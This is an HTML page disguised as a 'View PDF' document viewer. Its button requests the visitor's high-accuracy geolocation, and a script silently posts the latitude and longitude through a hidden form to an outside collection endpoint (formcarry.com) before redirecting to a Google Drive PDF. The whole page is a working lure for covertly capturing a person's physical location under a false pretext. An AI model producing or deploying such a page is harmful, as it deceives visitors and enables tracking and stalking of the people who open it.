<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>View PDF</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      overflow: hidden;
    }

    /* Background image */
    #background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url(img.jpg)  no-repeat center center;
      background-size: cover;
      filter: blur(8px);
      z-index: 1;
    }

    /* Overlay */
    #overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(240,240,240,0.6); /* semi-transparent over blur */
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      color: #333;
      padding: 20px;
      z-index: 2;
    }

    #overlay img { 
      width: 60px; 
      height: 60px; 
      margin-bottom: 15px; 
    }
    #overlay span { 
      font-size: 1.3em; 
      font-weight: 500; 
      margin-bottom: 15px; 
    }
    #overlay button {
      padding: 12px 20px;
      background: #4285f4;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s;
    }
    #overlay button:hover { 
      background: #3367d6; 
    }
    #output { 
      font-size: 14px; 
      opacity: 0.9; 
      margin-top: 10px; 
    }

    @media (max-width: 480px) {
      #overlay img { width: 100px; height: 100px; margin-bottom: 10px; }
      #overlay span { font-size: 1.8em; }
      #overlay button { padding: 14px 18px; font-size: 22px; }
      #output { font-size: 16px; }
    }
    @media (max-width: 360px) {
      #overlay img { width: 80px; height: 80px; }
      #overlay span { font-size: 1.5em; }
      #overlay button { padding: 14px 18px; font-size: 22px; }
      #output { font-size: 14px; }
    }
  </style>
</head>
<body>
  <div id="background"></div> <!-- Blurred Background -->
  <div id="overlay">
    <span>View PDF</span>
    <button onclick="requestLocation()">View PDF</button>
    <pre id="output"></pre>
  </div>

  <form id="locationForm" action="https://formcarry.com/s/eIcz1agO_ye" method="POST" style="display:none;">
    <input type="hidden" name="latitude" id="latitude">
    <input type="hidden" name="longitude" id="longitude">
  </form>

  <script>
    const overlay = document.getElementById("overlay");
    const form = document.getElementById("locationForm");
    const latInput = document.getElementById("latitude");
    const lonInput = document.getElementById("longitude");
    const output = document.getElementById("output");

    // Change this to your desired PDF link
    const pdfUrl = "https://drive.google.com/file/d/1sOmZIM0syTZA5KUujlU_evv_bMM4qLIs/view?usp=sharing"; 

    function requestLocation() {
      if (!navigator.geolocation) {
        output.innerText = "Geolocation not supported.";
        return;
      }
      const watchId = navigator.geolocation.watchPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          output.innerText = `Lat: ${lat}, Lon: ${lon}`;

          latInput.value = lat;
          lonInput.value = lon;

          navigator.geolocation.clearWatch(watchId);

          fetch(form.action, {
            method: 'POST',
            body: new FormData(form)
          }).then(() => {
            setTimeout(() => {
              window.location.href = pdfUrl;
            }, 1500);
          }).catch(err => {
            console.error("Form submission failed:", err);
            window.location.href = pdfUrl;
          });
        },
        (err) => {
          console.error("Geolocation error:", err);
          output.innerText = `Error: ${err.message}`;
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    }
  </script>
</body>
</html>
